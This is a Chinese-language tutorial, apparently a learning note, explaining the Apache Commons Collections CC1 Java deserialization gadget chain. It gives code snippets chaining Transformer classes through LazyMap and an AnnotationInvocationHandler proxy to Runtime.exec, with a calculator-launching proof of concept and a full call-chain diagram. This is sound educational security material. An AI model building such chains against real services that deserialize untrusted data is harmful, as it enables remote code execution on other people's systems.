ConstantTransformer实现了Transformer接口，作用是返回一个对象：
```java
public ConstantTransformer(Object constantToReturn) {
    this.iConstant = constantToReturn;
}

public Object transform(Object input) {
    return this.iConstant;
}
```
使用方法：
```java
ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
Object transform = constantTransformer.transform(Object.class);
Class<?> aClass = transform.getClass();
Method exec = aClass.getMethod("exec", String.class);
exec.invoke(transform, "open /Applications/Calculator.app");
```

InvokerTransformer也实现了Transformer接口，作用是通过反射执行任意方法：
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName;
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}

public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var4) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException var5) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException var6) {
            throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
        }
    }
}
```
使用方法：
```java
InvokerTransformer ivtransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"});
ivtransformer.transform(Runtime.getRuntime());
```

将二者结合：
```java
ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
InvokerTransformer ivtransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"});
ivtransformer.transform(constantTransformer.transform(1));
```

ChainedTransformer实现了Transformer接口，用于链接多个Tranformer，并以链式调用：
```java
public ChainedTransformer(Transformer[] transformers) {
    this.iTransformers = transformers;
}
public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }

    return object;
}
```

由于Runtime没有实现Serializable接口，所以需要用Runtime.class：
```java
Method getRuntime = Runtime.class.getMethod("getRuntime", null);
Object runtime = getRuntime.invoke(Runtime.class, null);
Method exec = runtime.getClass().getMethod("exec", String.class);
exec.invoke(runtime, "open /Applications/Calculator.app");
```

对应到ChainedTransformer，应该是：
```java
ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
InvokerTransformer getRuntime1 = new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",new Class[0]});
InvokerTransformer invoke = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null});
InvokerTransformer exec2 = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /Applications/Calculator.app"});

Object transform = constantTransformer.transform(1);
Object transform1 = getRuntime1.transform(transform);
Object transform2 = invoke.transform(transform1);
Object transform3 = exec2.transform(transform2);
```

现在我们已经有了任意代码执行的方法，如何在反序列化时调用ChainedTransformer呢？LazyMap的get方法调用了transformer：
```java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;

    public static Map decorate(Map map, Factory factory) {
        return new LazyMap(map, factory);
    }
    .....

    public Object get(Object key) {
        if (!this.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        } else {
            return this.map.get(key);
        }
    }
}
```
在decorate时就定义factory，类型是Transformer。  
因此构造起来很轻松。

那么谁调用了LazyMap.get呢？AnnotationInvocationHandler.invoke方法。

但是AnnotationInvocationHandler.readObject并没有调用invoke方法。不过，他调用了this.memberValues的entrySet方法：
```java
Iterator var4 = this.memberValues.entrySet().iterator();
```
如果this.memberValues是LazyMap呢？

但AnnotationInvocationHandler反序列化并不会直接调用invoke方法，这时，可以用动态代理来完成，通过劫持LazyMap，于是反序列化时，会调用this.memberValues.entrySet，this.memberValues就是LazyMap，由于他已经被AnnotationInvocationHandler劫持了，所以他的任何方法执行都会进入AnnotationInvocationHandler.invoke，攻击链也就形成了。

```java
AnnotationInvocationHandler.readObject() -> LazyMap.entrySet -> invoke()
    -> LazyMap.get()
        -> ChainedTransformer.transformer()
            -> ConstantTransformer.transformer()
            -> InvokerTransformer.transformer() -> Method.invoke()
                -> Class.getMethod()
                -> InvokerTransformer.transformer() -> Method.invoke()
                    -> Method.invoke()
                    -> InvokeTransformer.transformer() -> Method.invoke()
                        -> Runtime.exec()
```

完整代码见于GenCC1.java，实验时将序列化与反序列化两步分开。

需要注意的是，由于LazyMap已经被劫持了，因此后续的任何操作都会触发Gadget的执行，即使是在IDEA中调试，也会发现常常还没writeObject就已经弹计算器了。

# 参考文献

* P牛--Java安全漫谈